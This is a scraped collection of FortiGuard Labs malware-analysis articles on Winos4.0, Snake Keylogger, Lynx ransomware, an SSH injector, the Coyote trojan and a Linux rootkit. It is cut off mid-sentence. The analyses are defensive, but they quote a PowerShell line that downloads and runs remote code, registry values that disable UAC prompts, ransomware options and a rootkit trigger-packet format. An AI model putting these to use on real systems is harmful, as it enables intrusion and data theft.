20250109.exe is a launcher originally used to execute the actual APowerREC.exe in ./app/ProgramFiles. The attacker created the same folder structure in the ZIP file and used a loader to replace ApowerREC.exe. The fake ApowerREC.exe does nothing but call a function imported from lastbld2Base.dll. When an executable file is run, it loads all necessary DLL files and executes their entry functions. As a result, the DLLMain function of lastbld2Base.dll, where the malicious code is located, is loaded when the fake ApowerREC.exe is executed. Lastbld2Base.dll decrypts its data to get the shellcode for the next stage. At the bottom of the shellcode are configurations, including the IP address of the C2 server, the name of the base registry key for the next stage, and flags for features for the current stage. The optional features include permission evaluation, hiding the window of the current process, and anti-sandbox functions. If higher permission is needed in this attack, it tests the current permissions by opening the registry key HKEY_LOCAL_MACHINE\\SOFTWARE and executing ApowerREC.exe as an administrator. For the anti-sandbox function, it takes two screenshots within a two-second interval. If there are more than 20,000 different pixels in the second screenshot, which means a user is active on the computer, it performs its remaining tasks. Otherwise, it continues taking screenshot and compares it with the first one for at most one hour. After the optional features are run, it downloads the encrypted shellcode data and the Winos4.0 module from its C2 server. The encrypted data is written to HKEY_CURRENT_USER\\B118D5E900008F7A, the base registry for configurations in the next stage, with a value name of “0”. After this, it decrypts the data to get the shellcode, followed by partially decrypted data of the module. The new shellcode decrypts the data with another algorithm to get a DLL file and parses its export table to get the address of the only export function. In this attack, the module from the C2 server creates eight threads to perform different tasks: MainThread, CloseWindow, Screenshot, Keylog, Clipboard, USB, ReadReg, and Anti-AV. Mutex: Global\\MainThreadB118D5E900008F7AThe MainThread creates the remaining seven threads. In addition, it performs the following actions: API Constant Description SystemParametersInfoW SPI_SETSCREENSAVEACTIVE Deactivates the screen saver SetThreadExecutionState ES_CONTINUOUS ES_AWAYMODE_REQUIRED ES_SYSTEM_REQUIRED Enables the Away mode so the program keeps working while the computer appears to be sleeping PowerSetRequest PowerRequestDisplayRequired The display remains on even if the computer is idle Registry key: SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System Value name: ConsentPromptBehaviorAdmin Value: 0 Description: Allows the Consent Admin to perform an operation that requires elevation without consent or credentials. Registry key: SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System Value name: PromptOnSecureDesktop Value: 0 Description: Disables secure desktop prompting Mutex: Global\\ClosewWindowIt calls theEnumWindowsfunction to enumerate all visible windows to find the windows of kxecenter(Kingsoft Security) and HipsTray(Huorong). It checks the window's width to ensure it is the security prompt window. When the target window is found, it clicks the \"Permit\" button on the prompt window. Mutex: Global\\ScreenShotB118D5E900008F7AIt takes screenshots of applications that contain the keywords stored in the valuepicshotdataof HKEY_CURRENT_USER\\B118D5E900008F7A, and the screenshots are saved to C:\\ProgramData\\B118D5E900008F7A\\{keyword}\\{Date}.Ifpicshotdatadoesn’t exist, this thread will not be executed. Mutex: Global\\KeylogB118D5E900008F7AIt keeps checking the value of theKEYLOGof HKEY_CURRENT_USER\\B118D5E900008F7A. If the value is 1, it creates a mutex C:\\ProgramData\\B118D5E900008F7A\\Regedit.log and starts recording the user's keystrokes and the contents in the clipboard. The data is written to C:\\ProgramData\\B118D5E900008F7A\\Regedit.log. Mutex: Global\\ClipboardB118D5E900008F7AIt replaces keywords in the clipboard with the text stored in the registry value clipboarddata of HKEY_CURRENT_USER\\B118D5E900008F7A. The value contains three properties: Mode, Expression, and Replace. When Mode is “Modify,” Expression specifies the pattern to look for in the clipboard, and Replace specifies the replacement.If clipboarddata doesn’t exist, this thread will not be executed. Mutex: Global\\UsbB118D5E900008F7AIt collects the names of connected USB devices every three seconds except for those that include the following keywords: mouse, keyboard, wlan, lenovo, and sanmsung (misspelling of samsung). If a new USB device is inserted or removed, it updates the device list with a Chinese annotation that means “USB device inserted” or “USB device removed.” It reads the value B118D5E900008F7A0 from HKCU\\Console to get the shellcode and execute it every five seconds. First, it bypasses the UAC prompt by modifying the registry key values mentioned in MainThread. Then, it callsGetTcpTable2to obtain active TCP connections. If a TCP connection is owned by 360Safe, Kingsoft, or Huorong processes, it disables it. There are other attack chains used in this campaign. The查看10.exe(view10) is compiled from a Python script by Nuitka, and it loads Python311.dll, which is the malicious file. The shellcode from Python311.dll decrypts its data to get a DLL file that writes another shellcode to the registry value ofhrqnmlb{XXXXXX}of the HKCU\\Console\\, and the shellcode is also saved as bb.jpg in C:\\Users\\Public\\Download. The shellcode plays the same role as the shellcode from lastbld2Base.dll we mentioned above. However, its marker string is used by a version preceding the one described in areportreleased in November 2024. Another point worth mentioning is that the DLL contains multiple snippets of shellcode that are identical to Figure 13 except for the C2 domain. While only  9010[.]360sdgg[.]com is used in this attack, other domains have been observed in different campaigns. The 上线模块.dll(online module) is used to take screenshots of WeChat and the online bank, and the akagi.exe is a module of UACMe. Winos4.0 makes good use of registry keys. The C2 server writes most configurations for optional features and encrypts data to the values of the base registry key and its subkeys. This provides the flexibility of optional features. However, it’s also a good hint for forensic analysis. We can rebuild files from the data and perform further analysis.

    "content": "FortiGuard Labs Threat Research Affected platforms:Microsoft WindowsImpacted parties:Windows usersImpact:Silently records keystrokes to collect credentials, data, and other sensitive informationSeverity level:High FortiGuard Labs leveraged the advanced capabilities of FortiSandbox v5.0 (FSAv5) to detect a new variant of the Snake Keylogger (also known as 404 Keylogger). This malware, identified as AutoIt/Injector.GTY!tr, has been responsible for over 280 million blocked infection attempts, highlighting its extensive reach across regions. The majority of these detections have been concentrated in China, Turkey, Indonesia, Taiwan, and Spain, suggesting a significant impact in these areas. This high volume of detections underscores the malware’s ongoing global threat and its potential to affect organizations and users worldwide. The recent surge in activity also highlights the continuous evolution of keylogger malware and the need for advanced detection mechanisms. Typically delivered through phishing emails containing malicious attachments or links, Snake Keylogger is designed to steal sensitive information from popular web browsers like Chrome, Edge, and Firefox by logging keystrokes, capturing credentials, and monitoring the clipboard. In addition to data theft, Snake Keylogger exfiltrates the stolen information to its command-and-control (C2) server using SMTP (email) and Telegram bots, allowing attackers to access stolen credentials and other sensitive data. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. FSAv5 features a new AI engine, PAIX, an advanced machine learning-powered system designed to detect and analyze previously unknown threats in real-time. By utilizing a blend of behavioral analysis and file attributes, PAIX can identify suspicious activity and potential malware before they affect your environment. Integrated into FortiSandbox devices, the engine is regularly updated with the latest AI models to ensure optimal protection. In the following sections, we will explore how FSAv5 detected this malware, the behavioral indicators it leveraged for identification, and Snake Keylogger's technique to evade detection and analysis. We will also examine how FortiSandbox’s advanced heuristics and machine learning models contribute to identifying and mitigating emerging keylogger threats. The AI engine in FSAv5 provides detailed static analysis, uncovering obfuscated strings and embedded APIs responsible for keylogging and credential harvesting. Additionally, FSAv5’s dynamic analysis capabilities captured the keylogger’s runtime behavior, including processes launched by the malware and the establishment of network connections to its command-and-control (C2) server. These insights revealed Snake Keylogger’s ability to exfiltrate stolen data while avoiding traditional detection mechanisms, further emphasizing the importance of FSAv5’s comprehensive malware analysis. Additionally, suspicious indicators triggered during the analysis were recorded and categorized (Figure 3). This comprehensive documentation provides further context and aids in identifying potential malicious activities. With the enhancements in FSAv5, these indicators not only document observed behaviors but also correlate them with specific MITRE ATT&CK techniques. This correlation provides a deeper understanding of the tactics employed by the malware. The integrated AI in FSAv5 performs static analysis, enabling it to detect malware without executing its code. As shown in Figure 4, the AI engine can efficiently identify potential threats by analyzing the malware’s code structure, embedded signatures, and other static properties. This new variant of Snake Keylogger employs AutoIt, a scripting language commonly used for automating tasks in the Windows environment, to deliver and execute its malicious payload. AutoIt is often leveraged by threat actors due to its versatility and ability to generate standalone executables that can bypass traditional antivirus solutions. In this variant of Snake Keylogger, the executable is an AutoIt-compiled binary, which adds an additional layer of obfuscation to hinder detection and analysis. The use of AutoIt not only complicates static analysis by embedding the payload within the compiled script but also enables dynamic behavior that mimics benign automation tools. Figure 5 shows the AutoIt encrypted script used for compiling the binary. The AI in FSAv5 identified these embedded malicious strings and API calls. Upon execution, Snake Keylogger drops a copy of itself to the %Local_AppData%\\supergroup folder under “ageless.exe,” setting its attributes to hidden. Once established in this directory, it drops another file into the %Startup% folder, named ageless.vbs. This script contains a command that utilizes WScript.Shell() to call the Run () method, executing ageless.exe and ensuring the malware runs automatically upon system startup. The ageless.vbs script, as captured and backed up by FSAv5 for analysis, is shown in Figure 6. Snake Keylogger copies the ageless.vbs file into the Startup folder as a persistence mechanism, ensuring that it automatically executes each time the infected system reboots. This method is commonly used because the Windows Startup folder allows scripts, executables, or shortcuts to run without required administrative privileges. By leveraging this technique, Snake Keylogger can maintain access to the compromised system and re-establish a foothold even if the malicious process is terminated. Figure 7 illustrates an indicator of Snake Keylogger employing this persistence method. Additionally, Figure 8 shows a screenshot of the ageless.vbs file placed in the Startup folder. After the execution of ageless.exe, the malware injects its malicious payload into a legitimate .NET process. The observed sample targets the RegSvcs.exe process using a technique known as process hollowing, which allows the malware to execute its code within a trusted process to evade detection. Process hollowing works by first spawning RegSvcs.exe in a suspended state, preventing it from executing its legitimate code. Next, the malware deallocates the original code section and allocates new memory space within the hollowed process. Finally, it writes its malicious payload into the newly allocated space. When the process resumes, RegSvcs.exe executes the injected malicious code. This method allows the malware to conceal its presence, making it significantly harder for traditional security tools to detect and remove. By embedding itself within a trusted process, Snake Keylogger can operate undetected and continue its malicious activities. Figure 9 shows an indicator with its corresponding risk score, highlighting the severity of the threat. Another FSAv5 indicator that provides valuable insights into the malware’s capabilities is its ability to detect when the folder storing browser-related login credentials and other sensitive data is accessed, as shown in Figure 10. This indicator offers critical clues about the malware’s intent and behavior, highlighting its potential to compromise user data. Snake Keylogger leverages various techniques to exfiltrate stolen credentials and gather additional information about the victim. One such method involves using websites like hxxp://checkip[.]dyndns[.]org to retrieve the victim’s geolocation, further enhancing its reconnaissance capabilities. Additionally, Snake Keylogger uploads stolen credentials through several channels, including SMTP and Telegram bots, using HTTP Post requests to securely transmit the data to its command-and-control server, as shown in Figure 11. The FortiSandbox research team analyzed the malware through reverse engineering and dynamic sandbox analysis, revealing the full scope of its malicious capabilities. Figures 12 and 13 show that the malware employs specialized modules to steal sensitive data from browser autofill systems, including credit card details. To capture keystrokes, it leverages the SetWindowsHookEx API with the first parameter set to WH_KEYBOARD_LL (flag 13), a low-level keyboard hook that monitors keystrokes (see Figure 14). This technique allows the malware to log sensitive input such as banking credentials. FortiSandbox plays a pivotal role in detecting and analyzing advanced malware threats like Snake Keylogger. Leveraging its innovative static and dynamic analysis capabilities and the power of its PAIX engine, FortiSandbox ensures the comprehensive detection of sophisticated threats. Capturing detailed indicators of compromise also empowers users to proactively safeguard their systems against evolving malware attacks, providing valuable insights for effective mitigation. TheFortiSandboxidentifies the malware mentioned in this report and any variations of it. It does not rely on updates fromFortiGuard Antivirus; instead, it utilizes the PAIX engine’s Machine Learning technology to detect previously unknown threats. FortiGuard Antivirus specifically detects the malware described in this report as AutoIt/Injector.GTY!tr. This service is integrated into FortiGate, FortiMail, FortiClient, and FortiEDR solutions, providing protection to customers using these products with up-to-date defenses. Additionally, the FortiGuard Web Filtering Service detects and blocks the command-and-control (C2) server.

    "content": "FortiGuard Labs Threat Research FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This edition of the Ransomware Roundup covers the Lynx ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft WindowsImpact:Encrypts victims' files and demands ransom for file decryptionSeverity level:High 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. The first sample of the Lynx ransomware was made available on a publicly available file-scanning site in early July 2024, which coincides with other reports of its first availability. Our research found that the Lynx and INC ransomware, which first appeared in July 2023, look very similar. However, INC offers fewer options at the execution phase. We believe that INC ransomware is a predecessor to the Lynx ransomware. While INC ransomware is available for the Windows and ESXi platforms, we have not found a Lynx variant of the ransomware that affects non-Windows environments. The screenshot above shows the different options and functions an INC ransomware sample can perform. In contrast, the screenshot below shows what they are for a LYNX sample. LYNX ransomware offers more granular control than INC. Like most ransomware, INC and LYNX encrypt files on victims' Windows machines. Both families use the same encryption methods. Furthermore, both families modify the desktop background to display the ransom note. At the same time, both try to send the ransom note to connected printers. These can be seen in the following screenshots. Like other ransomware attacks, these demand a ransom to decrypt files via dropped ransom notes. Information on the infection vector used by the Lynx ransomware threat actor is unavailable. However, it is not likely to differ significantly from other ransomware groups. When run, the Lynx ransomware takes the following line arguments: Option Description --file <filePath> Encrypt only specified file(s) --dir <dirPath> Encrypt only specified directory/directories --mode fast Encrypt 5% from entire file --mode medium Encrypt 15% from entire file (default) --mode slow Encrypt 25% from entire file --mode entire Encrypt 100% from entire file --help Print this message --verbose Enable verbosity --silent Enable silent encryption (no extension and notes will be added) --stop-processes Try to stop processes via RestartManager --encrypt-network Encrypt network shares --load-drives Load hidden drives (will corrupt boot loader) --hide-cmd Hide console window --no-background Don't change background image --no-print Don't print note on printers --kill Kill processes/services --safe-mode Enter safe-mode The Lynx ransomware always kills processes containing the following strings to maximize damage: It kills services that contain the following strings: The Lynx ransomware then encrypts files on the compromised machines and adds a file extension “.LYNX” to the affected files. The ransomware avoids encrypting files in the following folders: The Lynx ransomware avoids encrypting files with the following extensions: It also performs the following actions: The Lynx ransomware drops the following ransom note in “README.txt”: The ransomware then replaces the desktop wallpaper with the same ransom message. The oldest Lynx ransomware sample (SHA2: eaa0e773eb593b0046452f420b6db8a47178c09e6db0fa68f6a2d42c3f48e3bc) displays a slightly different ransom note. It contains different TOR sites and an attacker email address not found in other Lynx ransomware. The ransom note directs victims to a chat site operated by the attacker on TOR, where victims must first register with a unique ID. The Lynx ransomware has a data leak site that posts victim information, including data stolen from victims. As of this writing (January 29, 2025), the data leak site lists 96 victims, with the latest publication date being January 20, 2025. Our investigation found the following about the Lynx ransomware victims listed on the data leak site: Note that victims who paid the ransom may have been removed from the data leak site, and as such, additional companies may be affected by the Lynx ransomware. Separate from the aforementioned chat site, the Lynx ransomware group operates a data leak site on TOR. The Lynx ransomware group claims they have a policy to exclude “governmental institutions, hospitals, or non-profit organizations as these sectors play vital roles in society.” However, some victims listed on the data leak site are organizations believed to be in the healthcare and energy sectors. As with other ransomware groups, each victim has its own data leak page with a description of the stolen documents, the revenue of the victim organization, and the date the data was leaked. The Lynx ransomware described in this report are detected and blocked by FortiGuard Antivirus as: FortiGate, FortiMail, FortiClient, and FortiEDR support theFortiGuard AntiVirus service. The FortiGuard AntiVirus engine is a part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected.

Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREEFortinet Certified Fundamentals (FCF)in Cybersecurity training. The training is designed to help end users learn about today's threat landscape and will introduce basic cybersecurity concepts and technology. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts.

    "content": "FortiGuard Labs Threat Research Affected Platform:LinuxImpacted Users:Linux-based network appliances or IoTImpact:Data exfiltrationSeverity Level:Medium ELF/Sshdinjector.A!tris a collection of malware that can be injected into the SSH daemon. Samples of this malware collection surfaced around mid-November 2024. While we have a good amount of threat intelligence on them (e.g., they areattributed to theDaggerFlyespionage group), nobody seems to have looked into what they actually do. In this blog post, we will focus on the reverse engineering of the attack’s binaries and how this reverse engineering was achieved. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. The attack uses several binaries: More precisely, the dropper checks if it is being run under root privileges and, if not, exits. It then checks whether the host is infected by searching for a file named/bin/lsxxxssswwdd11vv containingthe wordWATERDROP. If the host is not yet infected, it attempts to overwrite the legitimate binariesls,netstat,andcrondwith infected binaries (/bin/lsxxxssswwdd11vv,selfrecoverheader,mainpasteheade,r…). Finally, it searches the SSH daemon and, if necessary, infects it withlibsshd.so. The malicious payload is contained inlibsshd.so. The main element is found in a function named “haha.” It also creates two other threads from the functions “heihei” and “xixi”. Those three names refer to laughing in Chinese. Function “xixi” checks whether it has access to/root/intensify-mm-inject/xxx, in which case it will kill and restart both the SSH and Cron daemons. Function “heihei” connects to the remote C2 (hard-coded IP address 45.125.64[.]200, port 33200 or 33223) and listens for incoming commands. Command Id Description 1 SERVER_REQ_BASE_INFO. Exfiltrates uname, MAC address etc to C2 2 List running services, by listing files in/etc/init.d 3 Reads users from/etc/shadow 4 Lists running process 5 Tests access to/var/log/dmesg 6 Tests access to/tmp/fcontr.xml 7 Lists a given directory 8 File transfer 9 Opens a shell terminal 10 Executes a command in the terminal 11 Unloads and exits the malicious process 12 Removes a file 13 Renames a file 1000 SERVER_RET_ONLINE_ACK 0x80000001 Client status change notification. It sends base info, service list, read/etc/shadow. Communication with the C2 uses its own protocol. All packets include a hard-coded UUID (a273079c-3e0f-4847-a075-b4e1f9549e88), an identifier (afa8dcd81a854144), and the response to the command. Reverse engineering was performed using Radare2, assisted by Generative AI through theRadare2 extension“r2ai.” This study shows that AI provides excellent insights into the malware, delivering high-quality source code that complements the output obtained from a standard decompiler. For example, I usedr2ai in “auto” mode. In this mode, the user asks the AI a question, and the AI automatically performs the necessary steps with the radare2 disassembler to answer. This is particularly helpful for users who don’t know Radare2 well. In this screenshot, we see the AI automatically searches for strings in the binary, via r2’s command “iz”. The overview of the dropper is excellent.AI excels in reading large quantities of information and summarizing them. We can then ask the AI to decompile the main.While the AI-generated source code is easy to understand, its details are not always correct. By comparison, source code produced by decompilers is often difficult to read but is accurate. Because of this, it is important to remember that these approaches complement each other and are ideally viewed side by side. While AI performs very well, there are many cases in which it does not produce a satisfactory answer, at least not at first. The most common issue ishallucination, wherein the AIinventssomething that isn’t true. Worse, it’s not always easy for a human analyst to spot hallucinations because the AI can sound very convincing. For example, in the AI-generated code below, the AI completely created an upload and a download command that is pure invention. Another frequent issue isextrapolation, where the AI does not totally invent something butextrapolatesit. For example, the AI says the malware “manipulates” the MAC address. This is far-fetched. While itcreatesa string containing the host's MAC address and exfiltrates it, there is no modification of the MAC address. In a related example, the AI claims the malware hides its network communications. It does not. It hides on the OS by infecting common binaries such as netstat, but it does not attempt to hide the communication itself. Yet another issue isomissions. Omissions are the downside of AI’s power to summarize situations. Its summaries often lack the details a human would find important. For example, at some point, the malware tests access to a file named/tmp/fcontr.xml. Despite this being absolutely clear in the assembly,the first version of AI-generated code completely eluded this part. The solution to this issue is toask again by modifying the question/prompt for the AI. In this case, I simply added to the end of the prompt: “Please pay attention to what is around fcontr.xml” and it solved the problem. Of course, this requires knowing that something had been omitted in the first place. In fact,interactions with AI are seldom perfect in a single shot. Rather, they could be compared to a discussion with a capable colleague with impressive knowledge and intelligence but less intuition and experience. For this research, I kept my disassembler open. I used it several times to check for hallucinations, assist the AI (!) when it failed to find correct addresses or cross-references, or guide it to look into interesting parts. While disassemblers and decompilers have improved over the last decade, this cannot be compared to the level of innovation we are seeing with AI. This isoutstanding! AI is particularly good at providing overviews of samples and generating easy-to-understand source code.Fortunately—or not?—AI cannot workalone and must be piloted and complemented by competent human analysis to spot hallucinations(the most dangerous issues),refine questions, identify omissions, or guidethe AI in the most interesting direction. I haven’t discussedlanguage models yet. Obviously, r2ai’s results depend on the language model used. Language models are configurable, and we can conveniently switch from one to another, whether a local model or a remote one, free access or paid.

    "content": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:Controls victim’s device and collects sensitive informationSeverity Level:High Over the past month, FortiGuard Labs has identified several similar LNK files containing PowerShell commands designed to execute malicious scripts and connect to remote servers. These files are part of multi-stage operations that ultimately deliver the Coyote Banking Trojan. This malware primarily targets users in Brazil, seeking to harvest sensitive information from over 70 financial applications and numerous websites. Once deployed, the Coyote Banking Trojan can carry out various malicious activities, including keylogging, capturing screenshots, and displaying phishing overlays to steal sensitive credentials. In this article, we will detail the behavior of each stage. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. The LNK file executes the following PowerShell command, which connects to a remote server to initiate the next stage: -w hid -noni -ep Bypass -c “Start-Job -Name PSSGR -ScriptBlock { IEX (iwr -Uri ‘hxxps://tbet[.]geontrigame[.]com/zxchzzmism’ -UseBasicParsing).Content }; Start-Sleep 131.” We analyzed multiple malicious files by examining the “Machine ID” embedded within the LNK files. This unique identifier provides critical insights into the system where the LNK file originated. By extracting and analyzing this metadata, we traced connections to other malicious LNK files associated with Coyote.

This script employs specific commands to decode and execute the embedded shellcode, initiating the next phase of the malicious operation. The “bmwiMcDec” DLL file functions as a loader, utilizing VirtualAllocEx and WriteProcessMemory to inject the “npuGDec” payload. It then employs CreateRemoteThread to execute the injected malicious code, facilitating the continuation of the attack. The injected code leverages Donut, a tool designed to decrypt and execute the final MSIL (Microsoft Intermediate Language) payloads. This ensures seamless delivery and execution of the attack’s next stage. The decrypted MSIL execution file first establishes persistence by modifying the registry at “HCKU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run.” It checks for any existing PowerShell command in this registry entry. If found, it removes the existing entry and creates a new one with a randomly generated name. This new registry entry contains a customized PowerShell command pointing to download and execute a Base64-encoded URL, which facilitates the main functions of the Coyote Banking Trojan. The targeted URL for this operation is “hxxps://yezh[.]geontrigame[.]com/vxewhcacbfqnsw.” If the victim is the new target, it gathers basic system information, such as the machine name, username, and operating system, and sends it to a remote server. It also identifies installed antivirus products by querying the SecurityCenter2 namespace in Windows Management Instrumentation (WMI). The collected data is then concatenated with a “|” separator, encoded in Base64, and the resulting string is reversed. This processed string is appended as a parameter and sent back to the remote server as follows: “hxxps://yezh[.]geontrigame[.]com/hqizjs/?l=y4CMuADfvJHUgATMgM3dvRmbpdFI0Z2bz9mcjlWT8JXZk5WZmVGRgM3dvRmbpdFfzlmcoNEf0IDR0Ul(omit).” After setting and checking in, it calls “CreateProcess” to execute the PowerShell command that was added into the registry to invoke the payload: The payload “vxewhcacbfqnsw” is similar to the one downloaded from the LNK file but is noticeably larger. This increase in size is due to the inclusion of the main Coyote Baking Trojan. We obtained the MSIL file after decrypting the payload from the Donut shellcode. It contained the following functions: Length Description 10 Disconnect from server 11 Terminate program 12 Take screenshot as image/jpeg 13 Get a window's title bar text 14 Activate a window and restore it to its original size 15 Minimize a window 16 Activate a window and restore it to its normal size then display it as a maximized window 17 Kill targeted process 18 Show full-screen overlay 19 Restore a window and then maximize it 20 Remove the window handle 21 Shut down the device 22 Enable the Desktop Window Manager composition feature then shut down the device 23 Click mouse at a specific screen position 24 Copy a string to the clipboard and then simulate typing that string 25 Send the specified keys to the active application. If a key contains a ‘+,’ it is sent as an uppercase character; otherwise, it is sent as a lowercase character. 26 Disable DWM composition 27 Display the fake image for a specific target with a message. For example: “Trabalhando nas atualiza” (Working on updates), “Aponte a câmera para a imagem a seguir” (Point the camera at the following image) 28 Cleanup, unhook, and stop current monitoring 29 Control user-visible windows, close the window 30 Adjust the opacity 31 Enable keylogger or send the keylogger’s result with separator ‘¾’ 32 N/A 33 Simulate key presses to perform automated navigation actions: {UP}, {RIGHT}, {DOWN}, and {LEFT} 34 Manipulate display settings 35 Send the given keys Coyote's infection process is complex and multi-staged. This attack leveraged an LNK file for initial access, which subsequently led to the discovery of other malicious files. This Trojan poses a significant threat to financial cybersecurity, particularly because it has the potential to expand beyond its initial targets.

    "title": "Deep Dive Into a Linux Rootkit Malware",
    "link": "https://www.fortinet.com/blog/threat-research/deep-dive-into-a-linux-rootkit-malware",
    "content": "FortiGuard Labs Threat Research Affected platforms:CentOS LinuxImpacted parties:CentOS UsersImpact:Full remote control of a victim’s deviceSeverity level:Critical This is a follow-up analysis to a previous blog about azero day exploitwhere the FortiGuard Incident Response (FGIR) team examined how remote attackers exploited multiple vulnerabilities in an appliance to gain control of a customer’s system. At the end of that blog, we revealed that the remote attacker had deployed a rootkit (a loadable kernel module, sysinitd.ko) and a user-space binary file (sysinitd) on the affected system by executing a shell script (Install.sh). Additionally, to establish rootkit persistence, entries for the rootkit malware were added in the /etc/rc.local and /etc/rc.d/rc.local files so the rootkit malware is loaded during system startup. During our analysis of the image of the compromised device, we found that its Linux audit logs contained user-space shell commands executed by the Threat Actor on the appliance. The executed shell commands were stored as hexadecimal blobs in the audit logs.  One of the log entries found was as follows: 2024-09-07 03:26:18 When decoded, the hexadecimal resulted in a base64-encoded blob. Decoding the base64 blob produced a tgz file, which, upon decompression, produced the following two files. Analysis ofinstall.sh, which is an injector script, reveals that as a default, it installs a shareable object,sysinitd.so, in the location/usr/share/empty/. Pivoting from this, the FGIR team analyzed the image of the compromised Ivanti box and retrieved two malicious files created by the Threat Actor on the disk in the location/usr/share/empty/. One of the two files was the rootkit—the malicious kernel modulesysinitd.so, which is referred to as sysinitd.ko in this analysis. FortiGuard conducted an in-depth analysis of the malicious rootkit malware. This analysis reveals how the kernel module hijacks the inbound network traffic to the compromised Ivanti system, how the user-space malicious file is started, and how it communicates with the rootkit module. The analysis also sheds light on the overall purpose of the rootkit malware. The command “readelf –h sysinitd.ko” displays the kernel module's ELF (Executable and Linkable Format) file header information, as shown in Figure 1. Its ELF type is “REL (Relocatable file),” which is the expected type for the kernel modules. The kernel module is loaded and starts functioning after executing the command “insmod /usr/share/empty/init/sysinitd.ko,” as shown in Figure 2. When the kernel module is inserted into the kernel, its init_module() function is called. It performs some initialization tasks, such as setting values to some global variables, decrypting strings, registering a network hook function, creating file descriptors under the “/proc” folder, and more. Figure 3 illustrates how it decrypts the encrypted string by calling a function. In this example, the string “abrtinfo” has just been decrypted. It will be used later when creating procfs (process filesystem) entries. Next, the kernel module calls the kernel API, nf_register_hook(), to register a Netfilter hook. Figure 4 shows the contextual ASM instructions for calling nf_register_hook(). The API only takes the structure “nf_hook_ops” as its argument, which specifies a hook function, hook number, priority, and protocol family. The hook callback function is “network_hook_func_15()”(in Figure 4). The protocol family for the IPv4 protocol is 2. The hook number is 0 for NF_INET_PRE_ROUTING, a hook point in the Linux kernel's Netfilter framework where incoming packets are intercepted before any routing decision is made. This is typically the first point where packets are intercepted after they arrive in the system. One of the two files was the rootkit, which lists all the available values for the hook number option and their descriptions: Value Macro Description 0 NF_INET_PRE_ROUTING Packet received, before routing decision. 1 NF_INET_LOCAL_IN Packet destined for the local machine, after routing. 2 NF_INET_FORWARD Packet being forwarded to another machine. 3 NF_INET_LOCAL_OUT Packet originating from the local machine, before routing. 4 NF_INET_POST_ROUTING Packet after routing, ready for transmission. Afterward, the init_module() function of the kernel module (sysinitd.ko) creates three procfs entries in the folder “/proc/” using the kernel API proc_create_data(). The names of the procfs entries are taken from the string “abrtinfo” decrypted earlier. The following ASM instruction snippet demonstrates the creation of the three procfs entries. […] .text:023D6xorr8d, r8d .text:023D9movrcx, offset as_STDIN_FD .text:023E0xoredx, edx .text:023E2movesi, 1B6h; \"RW-RW-RW-\" .text:023E7movrdi, offset byte_3275; \"abrtinfo\" .text:023EEcallproc_create_data .text:023F3xorr8d, r8d .text:023F6movrcx, offset as_STDOUT_FD .text:023FDxoredx, edx .text:023FFmovesi, 1B6h; \"RW-RW-RW-\" .text:02404movrdi, offset byte_3276; \"brtinfo\" .text:0240Bmovcs:gv_26, rax .text:02412callproc_create_data .text:02417xorr8d, r8d .text:0241Amovrcx, offset as_control_STDIN_FD .text:02421xoredx, edx .text:02423movesi, 1B6h; \"RW-RW-RW-\" .text:02428movrdi, offset byte_3277; \"rtinfo\" .text:0242Fmovcs:gv_261, rax .text:02436callproc_create_data […] All the procfs entries’ permissions are set as 1B6h, which stands for “rw-rw-rw-,” granting read/write access to all users. Their names are all derived from the string “abrtinfo” but at different offsets: “abrtinfo” at offset 0x3275, “brtinfo” at offset 0x3276 and “rtinfo” at offset 0x3277. Figure 5 shows the three created files. The Install.sh determines whether the kernel module has been successfully loaded by checking whether “/proc/abrtinfo” has been created. We have learned that the three procfs entries act as file descriptors when the user-space process (sysinitd) runs, where “/proc/abrtinfo” will be sysinitd’s stdin, “/proc/brtinfo” will be sysinitd’s stdout, and “/proc/rtinfo” will pass the control commands to sysinitd. In the kernel module, there are many callback functions bound to these procfs entries: Linux calls the Netfilter hook function once the incoming IPv4 packets, UDP and TCP, arrive. The malware focuses solely on the TCP packets (the protocol value is 6). It compares the protocol value of the received packet and ignores non-TCP packets. TCP sessions are established with a three-way handshake. As a result, the attacker must establish a TCP session with the services running on the compromised system, such as HTTP (port 80), HTTPS (443), SSH (22), FTP (21), and more. For the hook function to recognize the packet from the attacker, the attacker must send a special packet to the compromised system (referred to as the attack-init packet (the first packet) in this analysis). The attack-init packet must be 0xd bytes long and in the following format: Offset Length Description 0x00 1 “\\x31” or “\\x30”. A flag to enable or disable encryption for traffic. 0x01 4 Verification data.  “Dw1” 0x05 4 Verification data.  “Dw5” 0x09 4 Verification data.  “Dw9” To get the packet through, it must also meet the following conditions: 1>  Dw1 == Dw9 ^ 0x32C21F0A2> Dw5 == Dw9 ^ 0xED22AF9E or Dw5 == Dw9 ^ 0x4B1EF486 An example of a crafted attack-init packet looks like this: 